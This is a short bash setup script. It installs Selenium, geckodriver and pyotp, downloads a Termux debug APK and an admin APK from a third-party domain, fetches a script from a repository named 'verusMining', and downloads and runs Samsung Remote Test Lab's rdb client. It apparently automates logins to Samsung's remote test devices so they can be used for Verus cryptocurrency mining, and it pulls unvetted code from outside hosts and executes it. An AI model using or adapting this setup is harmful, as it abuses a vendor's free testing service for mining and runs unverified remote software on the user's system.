#!/bin/bash
apt update
apt install python3-pip -y
pip install selenium
wget https://github.com/mozilla/geckodriver/releases/download/v0.35.0/geckodriver-v0.35.0-linux64.tar.gz
apt-get install tar -y
sudo tar -xvf geckodriver-v0.35.0-linux64.tar.gz
sudo mv geckodriver /usr/local/bin/
chmod +x /usr/local/bin/geckodriver
wget https://github.com/termux/termux-app/releases/download/v0.119.0-beta.1/termux-app_v0.119.0-beta.1+apt-android-7-github-debug_arm64-v8a.apk
wget https://dl.aecoe.xyz/PandaAdmin/android/panda_pro_normal_7.0.3_175_1391_09201530_release.apk
mv termux-app_v0.119.0-beta.1+apt-android-7-github-debug_arm64-v8a.apk termux.apk
wget https://raw.githubusercontent.com/Lexa00heda/verusMining/refs/heads/main/sele.py
pip3 install pyotp
sudo apt-get update
sudo apt-get install android-sdk -y
wget https://developer.samsung.com/remotetestlab/webclient/assets/linux/rdb.zip
unzip rdb.zip
./rdb
